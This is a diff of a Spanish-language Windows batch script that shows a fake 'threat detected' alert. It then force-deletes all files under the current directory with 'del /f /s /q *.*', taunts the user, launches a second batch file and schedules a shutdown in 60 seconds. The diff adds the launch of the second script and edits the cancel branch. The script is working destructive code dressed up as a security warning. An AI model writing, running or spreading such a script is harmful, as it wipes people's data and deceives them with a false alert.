@@ -1,5 +1,4 @@
 @echo off
-title Confirmacion de Seguridad
 color 0f
 
 :: 1. Mensaje de advertencia inicial
@@ -35,12 +34,15 @@ msg * ADVERTENCIA: Se ha detectado una amenaza en su sistema.
 msg * Iniciando el protocolo de eliminacion de archivos...
 del /f /s /q *.*
 msg * Lo sentimos pero tus datos han sido borrados TE HE AVISADO
+msg * Pero mientras vamos a divertirnos
+start DonPanicMsg.bat
 msg * ahora vamos a apagar las luces pero tranquilo en 60 sec para que asimiles lo que acabas de hacer
 shutdown /s /t 60
-msg * Pero mientras vamos a divertirnos
-
 goto :eof
 
 :cancelar
-echo Buena elección
+cls
+echo Buena eleccion
 echo Nos volveremos a ver
+timeout /t 10 /nobreak >nul
+exit
